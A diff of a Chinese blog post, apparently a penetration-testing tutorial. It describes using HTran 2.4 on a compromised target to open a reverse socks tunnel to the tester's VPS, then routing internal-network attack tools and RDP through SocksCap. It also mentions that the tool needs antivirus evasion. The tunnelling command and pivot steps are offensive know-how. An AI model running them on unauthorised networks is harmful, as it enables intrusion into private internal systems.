@@ -597,7 +597,7 @@
 <p>0x03 上面都准备好以后,此时再回到目标机器上,开始和vps建立socks连接,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># HTran2.4.exe -s -connect 192.168.3.251[实际测试中应该是自己vps的ip] 1080</span></div></pre></td></tr></table></figure></p>
 <p><img src="/img/htran_socks_connect.png" alt=""></p>
 <p>0x04 连接建立后,我们现在就可以回到我们自己本地的渗透系统中,安装好socskcap代理工具 [当然,你用别的socks客户端也一样],然后再工具设置中填写好vps的ip和socks代理的端口 [这里是1234这个端口],不过,要注意,如果你的vps开了防火墙,务必记得把这几个代理用到的端口都放开,要不然,数据是过不来的<br><img src="/img/htran_socks_sockcap.png" alt=""></p>
-<p>0x05 最后,在把自己常用的一些内网渗透工具加到该代理工具中,就可以对目标进行正常内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""></p>
+<p>0x05 最后,再把自己常用的一些内网渗透工具加到sockscap中,就可以对目标进行正常的内网渗透了,效果如下<br><img src="/img/htran_socks_sockcap_res.png" alt=""><br><img src="/img/htran_socks_sockcap_rdp.png" alt=""></p>
 <p><br><br>关于htran:<br>&nbsp;&nbsp;&nbsp;&nbsp;可能唯一的缺点还是需要免杀,工具也相对比较老了,2.4的源码应该早就放出来了,有兴趣可以down下来仔细分析下,个人觉得在实际测试中,它比lcx稍稳定一些,速度也还可以,确实是个很贴心的小工具<br><br><br></p>
 
         </div>
